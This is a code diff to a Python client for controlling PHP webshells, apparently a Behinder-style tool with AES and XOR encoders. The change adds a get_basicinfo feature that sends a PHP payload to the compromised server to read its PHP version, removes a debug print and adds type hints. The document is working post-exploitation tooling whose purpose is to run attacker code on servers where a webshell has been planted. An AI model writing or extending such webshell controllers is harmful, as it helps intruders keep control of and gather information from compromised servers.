@@ -16,7 +16,7 @@ from Crypto.Util.Padding import pad
 
 from . import exceptions
 from ..utils import random_english_words
-from .base import Session, DirectoryEntry
+from .base import Session, DirectoryEntry, BasicInfoEntry
 
 logger = logging.getLogger("sessions.php")
 
@@ -72,6 +72,15 @@ else if(filesize($filePath) > MAX_SIZE) {
 }
 """
 
+GET_BASIC_INFO_PHP = """
+$infos = array();
+array_push($infos, [
+    "key" => "PHPVERSION",
+    "value" => phpversion()
+]);
+echo json_encode($infos);
+"""
+
 PAYLOAD_SESSIONIZE = """
 $b64_part = 'B64_PART';
 if(!$_SESSION['PAYLOAD_STORE']) {
@@ -110,6 +119,8 @@ __all__ = [
     "PHPWebshellBehinderAES",
     "PHPWebshellBehinderXor",
 ]
+
+basic_info_names = {"PHPVERSION": "当前PHP版本"}
 
 
 def md5_encode(s):
@@ -258,6 +269,25 @@ class PHPWebshell(Session):
             return False
         return (first_string + second_string) in result
 
+    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
+        json_result = await self.submit(GET_BASIC_INFO_PHP)
+        try:
+            raw_result = json.loads(json_result)
+            result = [
+                {
+                    "key": (
+                        basic_info_names[entry["key"]]
+                        if entry["key"] in basic_info_names
+                        else entry["key"]
+                    ),
+                    "value": entry["value"],
+                }
+                for entry in raw_result
+            ]
+            return result
+        except json.JSONDecodeError as exc:
+            raise exceptions.UnexpectedError("解析目标返回的JSON失败") from exc
+
     async def _submit(self, payload: str) -> str:
         """将php payload通过encoder编码后提交"""
         start, stop = (
@@ -272,7 +302,6 @@ class PHPWebshell(Session):
             session_id=self.session_id,
         )
         payload = compress_php_code(payload)
-        print(payload)
         payload = self.encode(payload)
         status_code, text = await self.submit_raw(payload)
         if status_code != 200:
@@ -294,7 +323,7 @@ class PHPWebshell(Session):
         idx_stop = idx_stop_r + idx_start
         return text[idx_start + len(start) : idx_stop]
 
-    async def submit(self, payload: str):
+    async def submit(self, payload: str) -> str:
         # sessionize_payload
         payloads = [payload]
         if self.options.sessionize_payload:
